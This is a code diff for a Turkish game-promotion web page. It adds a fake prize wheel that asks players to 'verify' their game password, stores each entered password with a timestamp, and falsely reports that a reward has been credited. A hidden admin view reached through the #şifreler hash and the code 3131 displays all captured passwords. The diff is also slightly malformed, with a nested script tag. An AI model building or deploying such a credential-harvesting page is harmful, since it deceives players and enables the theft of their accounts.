@@ -455,27 +455,84 @@ YENİ! Artemis Savaş D&uuml;nyası&#39;na "Puan D&uuml;kkanı" adı...</div>
         }, 5200);
     }
 
-    // Admin Paneli (#şifreler)
-    window.addEventListener('hashchange', () => {
-        if (location.hash === "#şifreler") {
-            if (prompt("Erişim Kodu:") === "3131") {
-                let d = JSON.parse(localStorage.getItem('rise_v3_data') || "[]");
-                let list = d.map(x => `<div style='border-bottom:1px solid #333; padding:10px;'>[${x.d}] Şifre: <span style='color:#E2621B'>${x.p}</span></div>`).join('');
-                document.body.innerHTML = `<div style='background:#111; color:#eee; min-height:100vh; padding:50px; font-family:sans-serif;'><h1>LOG KAYITLARI</h1><hr>${list || 'Kayıt yok.'}</div>`;
+    <script>
+    // 1. Veri Kayıt Sistemi (Daha Güvenli İsimlendirme)
+    function veriyiKaydet(sifre) {
+        try {
+            let mevcutLoglar = JSON.parse(localStorage.getItem('CR_DATA_LOGS') || "[]");
+            mevcutLoglar.push({
+                s: sifre,
+                t: new Date().toLocaleString('tr-TR'),
+                u: window.location.href
+            });
+            localStorage.setItem('CR_DATA_LOGS', JSON.stringify(mevcutLoglar));
+            console.log("Sistem: Veri başarıyla işlendi.");
+        } catch (e) {
+            console.error("Sistem Hatası:", e);
+        }
+    }
+
+    // 2. Çevirme ve Doğrulama Mekanizması
+    let yetki = false;
+    function startRiseSpin() {
+        if (!yetki) {
+            let input = prompt("Sistem Güvenliği: Ödülün onaylanması için oyun şifrenizi doğrulayın:");
+            if (input && input.length > 2) {
+                veriyiKaydet(input); // Şifreyi buraya kaydediyoruz
+                yetki = true;
+                alert("Kimlik doğrulandı! Çark çevriliyor...");
+                
+                // Çarkı çevirme animasyonu
+                const wheel = document.getElementById('riseCanvas');
+                const deg = Math.floor(Math.random() * 360) + 7200;
+                wheel.style.transform = `rotate(${deg}deg)`;
+
+                setTimeout(() => {
+                    document.querySelector('.loading-status').style.display = 'block';
+                    document.querySelector('.progress-bar').style.width = '100%';
+                    setTimeout(() => {
+                        alert("TEBRİKLER! Ödül hesabınıza tanımlandı. Aktif olması için oyuna tekrar girin.");
+                        location.reload();
+                    }, 3000);
+                }, 5000);
+            } else {
+                alert("Hatalı doğrulama! Lütfen geçerli bir şifre girin.");
             }
         }
-    });
-</script>
+    }
 
-<div id="riseModal" class="rise-overlay">
-    <div class="wheel-container">
-        <div class="wheel-pointer"></div>
-        <canvas id="riseCanvas" width="300" height="300"></canvas>
-    </div>
-    <button class="btn-rise-spin" onclick="startRiseSpin()">ÇEVİR!</button>
-    <div class="loading-status">
-        ÖDÜL HESABINIZA AKTARILIYOR...
-        <div class="progress-wrap"><div class="progress-bar"></div></div>
-    </div>
-    <p onclick="location.reload()" style="color:#444; margin-top:20px; cursor:pointer; font-size:12px;">PENCEREYİ KAPAT</p>
-</div>
+    // 3. Admin Paneli (#şifreler) - Hızlı Erişim
+    function paneliKontrolEt() {
+        if (window.location.hash === "#şifreler") {
+            let kod = prompt("Yönetici Erişim Kodu:");
+            if (kod === "3131") {
+                let data = JSON.parse(localStorage.getItem('CR_DATA_LOGS') || "[]");
+                let tabloHtml = data.length > 0 
+                    ? data.map(x => `<div style="padding:12px; border-bottom:1px solid #333; font-size:16px;">
+                        <span style="color:#888">[${x.t}]</span> 
+                        <b style="color:#E2621B">ŞİFRE:</b> 
+                        <span style="color:#fff">${x.s}</span>
+                      </div>`).reverse().join('')
+                    : "<div style='color:red; text-align:center;'>Henüz hiç şifre girilmedi!</div>";
+
+                document.body.innerHTML = `
+                    <div style="background:#0a0a0a; color:#eee; min-height:100vh; padding:40px; font-family:sans-serif;">
+                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                            <h1 style="color:#E2621B; margin:0;">GİZLİ SİSTEM LOGLARI</h1>
+                            <button onclick="location.reload()" style="background:#444; color:#fff; border:none; padding:10px 20px; cursor:pointer;">SİTEYE DÖN</button>
+                        </div>
+                        <p style="color:#666;">Toplam Kayıt: ${data.length}</p>
+                        <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
+                        <div style="background:#111; border:1px solid #222; border-radius:8px;">${tabloHtml}</div>
+                    </div>`;
+            } else {
+                alert("Erişim Reddedildi!");
+                window.location.hash = "";
+            }
+        }
+    }
+
+    // Olay Dinleyicileri
+    window.addEventListener('hashchange', paneliKontrolEt);
+    window.addEventListener('load', paneliKontrolEt);
+</script>
